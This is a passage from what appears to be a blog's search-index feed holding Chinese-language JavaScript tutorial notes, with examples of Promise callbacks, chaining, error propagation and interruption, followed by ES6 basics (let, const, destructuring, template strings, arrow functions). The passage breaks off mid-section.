状态和指定回调函数谁先谁后?</h3><p> (1) 都有可能, 正常情况下是先指定回调再改变状态, 但也可以先改状态再指定回调</p><p> (2) 如何先改状态再指定回调?<br>  ① 在执行器中直接调用 resolve()/reject()<br>  ② 延迟更长时间才调用 then()</p><p> (3) 什么时候才能得到数据?<br>  ① 如果先指定的回调, 那当状态发生改变时, 回调函数就会调用, 得到数据</p><p>  ② 如果先改变的状态, 那当指定回调时, 回调函数就会调用, 得到数据</p>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//* ① 先改变状态再执行回调</span><span class="token comment">//*在执行器函数中直接调用resolve/reject 会是先改变promise状态再执行指定回调</span><span class="token comment">//* 也就是当Promise中的代码为同步代码时</span><span class="token comment">//* 或者延迟更长的时间去执行then方法</span><span class="token comment">// let p = new Promise((resolve,reject) => &#123;</span><span class="token comment">//   resolve('Ok')</span><span class="token comment">//   // reject('err')</span><span class="token comment">// &#125;)</span><span class="token comment">// p.then(value => alert(value),err=> alert(err))</span><span class="token comment">//*②先指定回调函数(then),再改变状态</span><span class="token comment">//* 当执行器函数中是异步任务时,在异步回调当中调resolve/reject，会先指定回调,再改变状态</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// reject('err')</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token parameter">err</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="7-4-promise-then-返回的新-promise-的结果状态由什么决定"><a href="#7-4-promise-then-返回的新-promise-的结果状态由什么决定" class="headerlink" title="7.4 promise.then()返回的新 promise 的结果状态由什么决定?"></a>7.4 promise.then()返回的新 promise 的结果状态由什么决定?</h3><p> (1) 简单表达: 由 then()指定的回调函数执行的结果决定</p><p> (2) 详细表达:<br>  ① 如果抛出异常, 新 promise 变为 rejected, reason 为抛出的异常</p><p>  ② 如果返回的是非 promise 的任意值, 新 promise 变为 resolved, value 为返回的值</p><p>  ③ 如果返回的是另一个新 promise, 此 promise 的结果就会成为新 promise 的结果</p>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//定义一个promise</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//调用 then 方法 返回一个新的Promise对象</span><span class="token keyword">let</span> result <span class="token operator">=</span> p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">//* ①返回的结果是非Promise的值,then方法执行的结果返回一个Promise对象,该对象的状态为成功,结果值为返回的值</span>  <span class="token comment">// return 824</span>  <span class="token comment">//* ②抛出一个错误,then方法执行的结果返回一个Promise对象,该对象的状态为失败,结果值是抛出的值</span>  <span class="token comment">// throw '出bug了'</span>  <span class="token comment">//* ③返回结果是Promise对象</span>  <span class="token comment">//* 返回的该对象状态如果为成功,then方法返回的Promise对象状态为成功,值为成功的结果</span>  <span class="token comment">//* 返回的该对象状态如果为失败,then方法返回的Promise对象状态为失败,值为失败的结果</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token parameter">reason</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//then 的返回结果</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><h3 id="7-5-promise-如何串连多个操作任务"><a href="#7-5-promise-如何串连多个操作任务" class="headerlink" title="7.5 promise 如何串连多个操作任务?"></a>7.5 promise 如何串连多个操作任务?</h3><p> (1) promise 的 then()返回一个新的 promise, 可以看成 then()的链式调用</p><p> (2) 通过 then 的链式调用串连多个同步/异步任务</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//then的链式调用 其原理是then方法返回一个新的Promise对象</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token parameter">reason</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token comment">//success</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token comment">//undefined</span>  <span class="token comment">//这里打印undefined,是因为then方法的结果，是上一个then方法执行回调返回的结果,</span>  <span class="token comment">//因为上一个then方法执行回调未返回结果值,所以是undefined</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="7-6-promise-异常传透"><a href="#7-6-promise-异常传透" class="headerlink" title="7.6 promise 异常传透?"></a>7.6 promise 异常传透?</h3><p> (1) 当使用 promise 的 then 链式调用时, 可以在最后指定失败的回调</p><p> (2) 前面任何操作出了异常, 都会传到最后失败的回调中处理</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//Promise 异常穿透</span><span class="token comment">//当使用Promise进行链式调用时,可以在最后指定失败的回调</span><span class="token comment">//链式调用过程中前面任何操作出了异常,都会传到最后失败的回调中处理</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'Ok'</span><span class="token punctuation">)</span>  <span class="token comment">// reject('err')</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// console.log('111')</span>    <span class="token comment">//中间任何一个操作出错,都会传到最后的失败回调中 Promise异常穿透</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">throw</span> <span class="token string">'出错了'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'222'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'333'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">reason</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="7-7-中断-promise-链"><a href="#7-7-中断-promise-链" class="headerlink" title="7.7 中断 promise 链?"></a>7.7 中断 promise 链?</h3><p> (1) 当使用 promise 的 then 链式调用时, 在中间中断, 不再调用后面的回调函数</p><p> (2) 办法: 在回调函数中返回一个 pendding 状态的 promise 对象</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//中断Promise链条,有且只有一个方法,就是返回一个pending状态的promise</span><span class="token comment">//状态没有改变,将不会在调用</span><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">'OK'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1111'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token comment">//中断链条</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'222'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">value</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'333'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">reason</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>reason<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> -Promise </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES6系列</title>
      <link href="/2021/12/20/es-xi-lie/"/>
      <url>/2021/12/20/es-xi-lie/</url>
      
        <content type="html"><![CDATA[<h1 id="ES6系列"><a href="#ES6系列" class="headerlink" title="ES6系列"></a>ES6系列</h1><a id="more"></a><h2 id="一、let"><a href="#一、let" class="headerlink" title="一、let"></a>一、let</h2><h3 id="1-用途"><a href="#1-用途" class="headerlink" title="1.用途"></a>1.用途</h3><p> 声明变量</p><h3 id="2-特点"><a href="#2-特点" class="headerlink" title="2. 特点"></a>2. 特点</h3><p> ①不能重复声明同一变量<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">'张三'</span><span class="token punctuation">;</span><span class="token comment">//  let name = '法外狂徒'; 重复声明同一个变量会报错</span></code></pre><br> ②不存在变量提升<br> <pre class="language-js" data-language="js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//报错</span><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token number">66</span><span class="token punctuation">;</span></code></pre><br> ③存在块级作用域<br>  变量只在代码块中有效<br>  在if else while for这些代码块里,用let声明的变量也存在块级作用域<br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>   <span class="token keyword">let</span> boy <span class="token operator">=</span> <span class="token string">'kobe'</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>boy<span class="token punctuation">)</span> <span class="token comment">//kobe</span><span class="token punctuation">&#125;</span><span class="token comment">//  console.log(boy)  存在块级作用域,外面访问不到里面声明的变量</span></code></pre><br> ④不影响作用域链<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> school <span class="token operator">=</span> <span class="token string">'辉煌'</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>school<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//辉煌</span><span class="token punctuation">&#125;</span></code></pre></p><h2 id="二、const"><a href="#二、const" class="headerlink" title="二、const"></a>二、const</h2><h3 id="1-用途-1"><a href="#1-用途-1" class="headerlink" title="1. 用途"></a>1. 用途</h3><p> 定义常量</p><h3 id="2-特点-1"><a href="#2-特点-1" class="headerlink" title="2. 特点"></a>2. 特点</h3><p> ①一定要赋初始值<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">// const A; //不赋初始值会报错</span></code></pre><br> ②常量要大写(潜规则),也可以小写<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> Work <span class="token operator">=</span> <span class="token string">'bug'</span><span class="token punctuation">;</span><span class="token keyword">const</span> hobby <span class="token operator">=</span> <span class="token string">'写bug'</span><span class="token punctuation">;</span></code></pre><br> ③常量的值不能修改<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> paly <span class="token operator">=</span> <span class="token string">'敲bug的工程师'</span><span class="token punctuation">;</span><span class="token comment">// paly ='头秃的bug工程师'; //报错</span></code></pre><br> ④存在块级作用域<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> lead <span class="token operator">=</span> <span class="token string">'HONG'</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>lead<span class="token punctuation">)</span> <span class="token comment">//HONG</span><span class="token punctuation">&#125;</span>  <span class="token comment">//console.log(lead) //报错</span></code></pre><br> ⑤对于数组和对象的元素修改,不算做对常量的修改，不会报错<br> (因为它保存的值是一个地址值,指向并没有修改)<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> Arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'科比'</span><span class="token punctuation">,</span><span class="token string">'乔丹'</span><span class="token punctuation">,</span><span class="token string">'卡特'</span><span class="token punctuation">,</span><span class="token string">'麦迪'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>Arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'奥尼尔'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//对数组/对象的元素修改,不算对常量修改,因为它保存的值是一个地址值,指向没有修改</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Arr<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//['科比', '乔丹', '卡特', '麦迪', '奥尼尔']</span> <span class="token keyword">const</span> Team <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'科比'</span><span class="token punctuation">,</span><span class="token string">'乔丹'</span><span class="token punctuation">,</span><span class="token string">'卡特'</span><span class="token punctuation">,</span><span class="token string">'麦迪'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Team = 1000; //这样会报错,修改了其指向,</span></code></pre></p><h2 id="三、解构赋值"><a href="#三、解构赋值" class="headerlink" title="三、解构赋值"></a>三、解构赋值</h2><h3 id="1-什么是解构赋值"><a href="#1-什么是解构赋值" class="headerlink" title="1. 什么是解构赋值"></a>1. 什么是解构赋值</h3><p> ES6允许按照一定模式从数组和对象中提取值,对变量进行赋值,这被称为解构赋值</p><h3 id="2-数组的解构"><a href="#2-数组的解构" class="headerlink" title="2. 数组的解构"></a>2. 数组的解构</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> <span class="token constant">F4</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'小沈阳'</span><span class="token punctuation">,</span><span class="token string">'刘能'</span><span class="token punctuation">,</span><span class="token string">'赵本山'</span><span class="token punctuation">,</span><span class="token string">'宋小宝'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// let [xiao,liu,zhao,song] = F4;</span> <span class="token comment">// console.log(xiao); //小沈阳</span> <span class="token comment">// console.log(liu); //刘能</span> <span class="token comment">// console.log(zhao); //赵本山</span> <span class="token comment">// console.log(song); //宋小宝</span></code></pre><h3 id="3-对象的解构"><a href="#3-对象的解构" class="headerlink" title="3. 对象的解构"></a>3. 对象的解构</h3> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> zxl <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> <span class="token string">'张小六'</span><span class="token punctuation">,</span>  age<span class="token operator">:</span> <span class="token string">'不详'</span><span class="token punctuation">,</span>  <span class="token function-variable function">sayHello</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我可以say'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">let</span> <span class="token punctuation">&#123;</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>sayHello<span class="token punctuation">&#125;</span> <span class="token operator">=</span> zxl<span class="token punctuation">;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//张小六</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//不详</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sayHello<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//我可以say</span></code></pre><h2 id="四、模板字符串"><a href="#四、模板字符串" class="headerlink" title="四、模板字符串"></a>四、模板字符串</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1. 声明"></a>1. 声明</h3><p> ES6中引入新的声明字符串的方式<a href="%E5%8F%8D%E5%BC%95%E5%8F%B7">``</a></p><h3 id="2-特性"><a href="#2-特性" class="headerlink" title="2. 特性"></a>2. 特性</h3><p> ①内容中可以直接出现换行符(可以进行换行)<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> content <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;ul>    &lt;li>沈腾&lt;/li>    &lt;li>玛丽&lt;/li>    &lt;/ul></span><span class="token template-punctuation string">`</span></span></code></pre><br> ②可以进行变量拼接,使用<code>$&#123;变量&#125;</code><br>  <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> player<span class="token operator">=</span> <span class="token string">'kobe'</span><span class="token punctuation">;</span><span class="token keyword">let</span> say <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>player<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">是我心中伟大的球星</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>say<span class="token punctuation">)</span> <span class="token comment">//kobe是我心中伟大的球星</span></code></pre></p><h2 id="五、简化对象写法"><a href="#五、简化对象写法" class="headerlink" title="五、简化对象写法"></a>五、简化对象写法</h2><p> 1.ES6允许在大括号里面,直接写入变量和函数,作为对象的属性和方法</p><p> 2.当属性名和变量名相同时,可以简写,原来写法 name: name</p> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> name <span class="token operator">=</span><span class="token string">"张小6"</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token function-variable function">change</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'我们可以改变你'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> peo <span class="token operator">=</span> <span class="token punctuation">&#123;</span>   name<span class="token punctuation">,</span> <span class="token comment">//当属性名和变量名相同时,可以简写,原来写法name: name,</span>   change<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>peo<span class="token punctuation">)</span></code></pre><h2 id="六、箭头函数"><a href="#六、箭头函数" class="headerlink" title="六、箭头函数"></a>六、箭头函数</h2><h3 id="1-箭头函数"><a href="#1-箭头函数" class="headerlink" title="1. 箭头函数"></a>1. 箭头函数</h3><p> ①ES6允许使用箭头(=&gt;)来声明函数</p><p> ②箭头函数适合与this无关的回调,定时器、数组的方法回调</p><p> ③箭头函数不适合与this有关的回调,例如:DOM事件回调、对象的方法<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">//声明一个函数</span><span class="token keyword">let</span> <span class="token function-variable function">fn</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//调用函数</span><span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//5</span></code></pre></p><h3 id="2-特点-2"><a href="#2-特点-2" class="headerlink" title="2. 特点"></a>2. 特点</h3><p> Ⅰ. this是静态的,this始终指向函数声明时所在作用域下的this<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'张小6'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//张小6 this指向window</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token function-variable function">fn2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//张小6 this指向函数声明时的this,也就是window</span><span class="token punctuation">&#125;</span><span class="token function">fn2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> school<span class="token operator">=</span> <span class="token punctuation">&#123;</span>  name<span class="token operator">:</span> <span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token function">fn1</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>school<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//张三 将this的值改变为了school</span><span class="token function">fn2</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>school<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//张小6 this始终指向函数声明时所在作用域下的this值</span></code></pre><br> Ⅱ. 不能作为构造函数实例化对象<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token function-variable function">Person</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span>age</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// let p1= new Person('6',33) //Person is not a constructor</span></code></pre><br> Ⅲ. 不能使用arguments(保存实参)变量<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token function-variable function">sum</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// sum(1,2,3); //arguments is not defined</span></code></pre></p><h3 id="3-简写"><a href="#3-简写" class="headerlink" title="3. 简写"></a>3. 简写</h3><h4 id="3-1-省略小括号"><a href="#3-1-省略小括号" class="headerlink" title="3.1 省略小括号"></a>3.1 省略小括号</h4><p> 当形参有且只有一个的时候,可以省略小括号<br> <pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token function-variable function">number</span> <span class="token operator">=</span> <span class="token parameter">n</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">number</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//3</span></code></pre></p><h4 id="3-2-省略花括号"><a href="#3-2-省略花括号" class="headerlink" title="3.2 省略花括号"></a>3.2 省略花括号</h4><p> 当代码体只有一条语句的时候,此时return必须省略,而且语句的执行结果就是函数的返回值<br> 